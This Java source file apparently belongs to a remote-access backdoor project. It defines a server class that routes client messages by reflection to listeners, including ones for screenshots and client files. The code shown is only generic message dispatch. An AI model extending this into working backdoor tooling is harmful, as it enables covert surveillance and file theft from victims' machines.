package me.faintcloudy.advantagebackdoor.server.message;

import me.faintcloudy.advantagebackdoor.api.message.MessageHandler;
import me.faintcloudy.advantagebackdoor.api.message.MessageListener;
import me.faintcloudy.advantagebackdoor.api.message.play.client.ClientNetworkMessage;

import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.util.ArrayList;
import java.util.List;

public class NetworkMessageController {
    public NetworkMessageController()
    {
        this.register(new BasicMessageHandler());
        this.register(new ScreenShotListener());
        this.register(new ClientFileListener());
    }

    List<MessageListener> listeners = new ArrayList<>();
    public void call(ClientNetworkMessage message)
    {
        message.getUser().setLastMessageTime(System.currentTimeMillis());
        for (MessageListener handler : listeners) {
            for (Method method : handler.getClass().getMethods()) {
                if (method.isAnnotationPresent(MessageHandler.class) && method.getParameterTypes().length == 1)
                {
                    if (method.getParameterTypes()[0].equals(message.getClass())) {
                        try {
                            method.invoke(handler, message);
                        } catch (IllegalAccessException | InvocationTargetException e) {
                            e.printStackTrace();
                        }
                    }
                }
            }
        }
    }



    public List<MessageListener> getListeners() {
        return listeners;
    }

    public void register(MessageListener listener)
    {
        listeners.add(listener);
    }
}
